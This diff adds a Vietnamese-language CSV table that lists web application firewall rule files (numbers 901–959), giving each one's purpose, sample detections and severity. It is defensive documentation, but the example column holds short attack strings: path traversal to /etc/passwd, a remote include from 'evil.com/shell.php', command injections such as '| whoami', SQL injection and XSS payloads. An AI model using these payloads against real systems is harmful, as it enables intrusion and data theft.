@@ -1,0 +1,24 @@
+Mã Rule,Tên File,Loại,Mục đích,Ví dụ phát hiện,Mức độ quan trọng
+901,REQUEST-901-INITIALIZATION,Khởi tạo,Thiết lập các biến cấu hình và khởi tạo hệ thống,Thiết lập ngưỡng điểm anomaly; khởi tạo biến paranoia level,Hỗ trợ
+910,REQUEST-910-IP-REPUTATION,Danh tiếng IP,Kiểm tra IP có trong danh sách đen hoặc có lịch sử độc hại không,Chặn IP từ các nguồn spam; IP đã tấn công trước đó,Cao
+911,REQUEST-911-METHOD-ENFORCEMENT,Phương thức HTTP,Chỉ cho phép các phương thức HTTP được cấu hình,Chặn PUT; DELETE; TRACE; CONNECT nếu không được phép,Trung bình
+912,REQUEST-912-DOS-PROTECTION,Chống DoS,Phát hiện và ngăn chặn tấn công từ chối dịch vụ,Rate limiting; phát hiện flood request,Cao
+913,REQUEST-913-SCANNER-DETECTION,Phát hiện Scanner,Phát hiện các công cụ quét lỗ hổng tự động,Phát hiện Nmap; Nikto; SQLMap; Acunetix; Nessus,Trung bình
+920,REQUEST-920-PROTOCOL-ENFORCEMENT,Chuẩn giao thức,Kiểm tra request tuân thủ chuẩn HTTP,Content-Length phải là số; encoding hợp lệ; header hợp lệ,Trung bình
+921,REQUEST-921-PROTOCOL-ATTACK,Tấn công giao thức,Phát hiện tấn công qua giao thức HTTP,HTTP Request Smuggling; CRLF Injection; HTTP Response Splitting,Cao
+930,REQUEST-930-APPLICATION-ATTACK-LFI,Local File Inclusion,Phát hiện cố gắng đọc file nội bộ của server,Chặn ../../etc/passwd; /var/log/...; directory traversal,Rất cao
+931,REQUEST-931-APPLICATION-ATTACK-RFI,Remote File Inclusion,Phát hiện cố gắng tải và thực thi file từ server khác,Chặn include http://evil.com/shell.php; ftp://...,Rất cao
+932,REQUEST-932-APPLICATION-ATTACK-RCE,Remote Code Execution,Phát hiện cố gắng thực thi lệnh hệ thống từ xa,Chặn ; cat /etc/passwd; | whoami; `ls -la`,Rất cao
+933,REQUEST-933-APPLICATION-ATTACK-PHP,Tấn công PHP,Phát hiện các hàm PHP nguy hiểm,eval(); base64_decode(); system(); passthru(); shell_exec(),Rất cao
+934,REQUEST-934-APPLICATION-ATTACK-NODEJS,Tấn công Node.js,Phát hiện các pattern tấn công Node.js,child_process.spawn(); require('fs'); eval(),Rất cao
+941,REQUEST-941-APPLICATION-ATTACK-XSS,Cross-Site Scripting,Phát hiện tấn công XSS để đánh cắp dữ liệu người dùng,<script>alert()</script>; onerror=; javascript:; onmouseover=,Rất cao
+942,REQUEST-942-APPLICATION-ATTACK-SQLI,SQL Injection,Phát hiện tấn công SQL Injection vào database,' OR 1=1--; UNION SELECT; DROP TABLE; '; DELETE FROM,Rất cao
+943,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION,Chiếm phiên,Phát hiện cố gắng cố định hoặc đánh cắp session,Cố định session ID trong URL hoặc cookie; session hijacking,Cao
+944,REQUEST-944-APPLICATION-ATTACK-JAVA,Tấn công Java,Phát hiện các cuộc tấn công nhắm vào ứng dụng Java,Log4j exploit; OGNL injection; Java deserialization; Struts RCE,Rất cao
+949,REQUEST-949-BLOCKING-EVALUATION,Đánh giá chặn Request,Tính tổng điểm và quyết định chặn request hay không,So sánh anomaly score với ngưỡng inbound threshold,Hỗ trợ
+950,RESPONSE-950-DATA-LEAKAGES,Rò rỉ dữ liệu,Phát hiện rò rỉ thông tin nhạy cảm trong response,Lộ SQL error message; stack trace; thông tin debug,Cao
+951,RESPONSE-951-DATA-LEAKAGES-SQL,Rò rỉ SQL,Phát hiện thông tin lỗi SQL trong response,MySQL error; ODBC error; ORA-; SQL syntax error,Cao
+952,RESPONSE-952-DATA-LEAKAGES-JAVA,Rò rỉ Java,Phát hiện thông tin lỗi Java trong response,Java stack trace; NullPointerException; ClassNotFoundException,Trung bình
+953,RESPONSE-953-DATA-LEAKAGES-PHP,Rò rỉ PHP,Phát hiện thông tin lỗi PHP trong response,PHP Warning; PHP Fatal error; file path disclosure,Trung bình
+954,RESPONSE-954-DATA-LEAKAGES-IIS,Rò rỉ IIS,Phát hiện thông tin lỗi IIS/ASP trong response,ASP.NET error; IIS error page; .NET stack trace,Trung bình
+959,RESPONSE-959-BLOCKING-EVALUATION,Đánh giá chặn Response,Tính tổng điểm và quyết định chặn response hay không,So sánh anomaly score với ngưỡng outbound threshold,Hỗ trợ
